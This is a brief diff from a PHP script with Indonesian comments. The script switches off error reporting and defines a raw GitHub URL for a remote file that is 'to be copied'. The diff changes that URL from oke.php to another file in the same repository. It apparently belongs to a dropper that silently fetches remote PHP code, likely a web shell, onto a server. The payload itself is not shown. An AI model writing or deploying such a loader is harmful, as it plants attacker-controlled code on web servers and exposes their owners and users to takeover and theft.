@@ -5,7 +5,7 @@ ini_set('display_errors', 0);
 error_reporting(0);
 
 // Link RAW file GitHub yang akan disalin
-$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/main/oke.php';
+$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/im';
 
 // Fungsi ambil konten dari URL
 function fetch_from_url($url) {
